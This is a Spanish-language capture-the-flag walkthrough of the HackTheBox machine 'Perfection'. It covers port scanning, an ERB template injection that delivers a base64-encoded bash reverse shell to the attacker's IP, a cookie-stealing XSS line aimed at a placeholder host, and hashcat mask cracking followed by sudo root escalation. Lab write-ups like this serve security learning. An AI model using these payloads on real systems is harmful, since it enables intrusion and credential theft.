---
title: "Perfection"
description: "Perfection"
pubDate: 2025-05-20
---

https://app.hackthebox.com/machines/Perfection

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.11.253
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240510182805.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,80 10.10.11.253
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240510182853.png)

# Fase de ataque

## CRLF Inyection

Intentamos XSS inyection pero no deja porque lo detecta

````
# Cookie Hijacking
<script>document.location="http://<ip>?cookie="+document.cookie</script>
````

Encontramos una forma de inyectar comandos dentro de las categorias:

1. Convertimos a base64 el código que queremos ejecutar

````
echo "bash -i >& /dev/tcp/10.10.14.147/1111 0>&1" | base64
````

2. Insertamos el código junto al la inyeccion:

````
<%=system("echo+<base64>| base64 -d | bash"); %>1
````

3. Urlencodeamos el código correspondiente

````
%0a<%25%3dsystem("echo+%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4e%44%63%76%4d%54%45%78%4d%53%41%77%50%69%59%78%43%67%3d%3d|+base64+-d+|+bash")%3b+%25>1
````

4. Nos ponemos en escucha

````
nc -nlvp 1111
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240510192851.png)
\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

# Privilege Escalation

Encontramos un hash en una base de datos:

````
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
````

No se puede crackear
Encontramos un correo para Susan de como es la contraseña
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240510194637.png)
Podemos obsevar que el hash es el nombre_nombrealreves_numeroaletoriode1a1000000.

## Crackeamos

````
hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
````

Con la contraseña:

````
sudo -l
````

Vemos que tenemos acceso root

````
sudo su
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240510195643.png)
\[+\] ==pwned!==
